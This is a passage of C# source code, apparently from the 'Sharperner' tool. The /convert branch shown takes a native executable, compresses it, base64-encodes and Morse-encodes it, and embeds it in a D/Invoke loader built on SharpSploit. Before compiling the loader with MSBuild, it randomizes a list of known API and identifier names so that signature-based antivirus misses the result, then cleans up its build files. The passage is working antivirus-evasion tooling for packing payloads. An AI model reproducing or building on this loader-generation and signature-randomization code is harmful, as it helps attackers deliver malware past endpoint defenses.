                                    var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";

                                    File.Copy(loaderExecutableFilePath, currentDirOutputFile, true);

                                    if(File.Exists(loaderExecutableFilePath))
                                    {
                                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                                    }
                                    else
                                    {
                                        Console.WriteLine($"[!] Fail to generate file");
                                    }

                                }
                                catch
                                {
                                    Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
                                }

                                Console.WriteLine("[+] Doing some cleaning...");

                                //revert loader
                                File.WriteAllText(rootFile, temp);
                                File.Delete(loaderExecutableFilePath);

                                Thread.Sleep(1000);
                            }
                            catch
                            {
                                Console.WriteLine("[!] Error Compiling");
                            }

                        }

                    }
                
                }             

            }
            else if (arguments.ContainsKey("/convert"))
            {
                if (arguments.ContainsKey("/file") || arguments.ContainsKey("/type"))
                {
                    Console.WriteLine("[!] Other arguments can't be used with /convert");
                }
                else if (string.IsNullOrEmpty(arguments["/convert"]))
                {
                    Console.WriteLine("[!] Empty input file");
                }
                else
                {
                    filePath = arguments["/convert"];

                    if (!File.Exists(filePath)) //if file exists
                    {
                        Console.WriteLine("[+] File Not Found");
                        return;
                    }
                    else
                    {
                        if (ExeChecker.IsValidExe(filePath))
                        {
                            if (!filePath.EndsWith(".exe"))
                            {
                                Console.WriteLine("[!] Invalid extension");
                                return;
                            }
                            else
                            {
                                var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
                                var parentDir = directory.FullName;

                                outputFile = $"DInvoke_{Path.GetFileName(filePath)}";

                                var nativeBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\Program.cs");
                                var loaderFileContent = File.ReadAllText(nativeBinaryLoaderPath);
                                var tempLoaderFileContent = loaderFileContent;
                                var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");

                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit.");

                                var PEFile = File.ReadAllBytes(filePath);
                                var msBuildPath = GetMSBuildPath();

                                if (string.IsNullOrEmpty(msBuildPath))
                                {
                                    Console.WriteLine("[!] MSBuild path not found");
                                }
                                else
                                {
                                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");

                                    MorseForFun.InitializeDictionary();

                                    var compByteArray = Compress(PEFile);
                                    var b64String = Convert.ToBase64String(compByteArray);
                                    var morsedb64String = MorseForFun.Send(b64String);

                                    try
                                    {
                                        //replace all occurences
                                        string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
                                                    "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
                                                    "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};

                                        foreach (string signature in signatures)
                                        {
                                            string randomWord = GenerateRandomString();

                                            // randomizing in SharpSploit's lib
                                            foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
                                            {
                                                string libFileContent = File.ReadAllText(file);

                                                loaderFileContent = loaderFileContent.Replace(signature, randomWord);

                                                libFileContent = libFileContent.Replace(signature, randomWord);

                                                File.WriteAllText(file, libFileContent);

                                            }
                                        }

                                        loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);

                                    }
                                    catch
                                    {
                                        Console.WriteLine("[!] Error replacing values");
                                    }

                                    try
                                    {
                                        File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);

                                        Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");

                                        Thread.Sleep(2000);

                                        var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";

                                        if (File.Exists(nativeExecutableBinaryLoaderPath))
                                        {
                                            File.Copy(nativeExecutableBinaryLoaderPath, currentDirOutputFile, true);

                                            if (File.Exists(currentDirOutputFile))
                                            {
                                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                                            }
                                            else
                                            {
                                                Console.WriteLine("[!] Failed to copy file");
                                            }

                                        }
                                        else
                                        {
                                            Console.WriteLine($"[!] Fail to compile DInvoke project");
                                        }

                                    }
                                    catch
                                    {
                                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
                                    }

                                    Console.WriteLine("[+] Doing some cleaning...");

                                    //revert all library files
                                    foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
                                    {
                                        File.Copy($"{file}.ori", file, true);
                                    }

                                    //revert nativeBinaryLoader
                                    File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);

                                    File.Delete(nativeExecutableBinaryLoaderPath);

                                    Thread.Sleep(1000);
                                }

                            }
                        }
                        else
                        {
                            Console.WriteLine("[+] Invalid PE file");
                        }
                    }

                }

            }
            else
            {
                Console.WriteLine("[!] Invalid arguments");
            }

        }


    }

}
